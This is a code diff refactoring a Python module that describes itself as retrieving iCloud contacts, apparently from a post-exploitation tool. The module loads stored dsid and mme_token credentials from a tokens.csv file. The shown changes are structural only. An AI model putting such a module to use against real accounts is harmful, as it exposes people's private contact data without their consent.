@@ -1,6 +1,12 @@
-class Module:
+from modules.helpers import ModuleABC
+
+
+class Module(ModuleABC):
     def __init__(self):
-        self.info = {
+        self.code = None
+
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Retrieves iCloud contacts.",
             "References": [
@@ -8,9 +14,8 @@ class Module:
             ],
             "Task": False
         }
-        self.code = None
 
-    def setup(self, module_view, output_view, successful):
+    def setup(self, module_input, view, successful):
         successful.put(True)
 
     def run(self):
@@ -94,7 +99,7 @@ class Module:
             return sorted(cards)
 
         
-        tokens_file = get_program_directory() + "/tokens.csv"
+        tokens_file = PROGRAM_DIRECTORY + "/tokens.csv"
         dsid = None
         mme_token = None
         
